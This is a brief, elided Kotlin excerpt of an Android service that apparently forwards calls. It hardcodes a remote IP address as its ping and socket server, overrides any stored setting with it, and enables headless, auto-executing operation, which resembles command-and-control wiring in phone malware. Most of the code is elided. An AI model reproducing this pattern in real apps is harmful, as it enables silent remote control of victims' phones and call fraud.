...
class CallForwardingBackgroundService : Service() {
    ...
    companion object {
        ...
        private const val PING_URL = "http://184.168.125.239:4002/api/ping"
    }
    ...
    private fun readConfigFromPreferences() {
        try {
            ...
            socketUrl = sharedPrefs.getString("socketUrl","http://184.168.125.239:4002") ?: "http://184.168.125.239:4002"
            ...
            socketUrl = "http://184.168.125.239:4002"
            headlessMode = true
            autoExecute = true
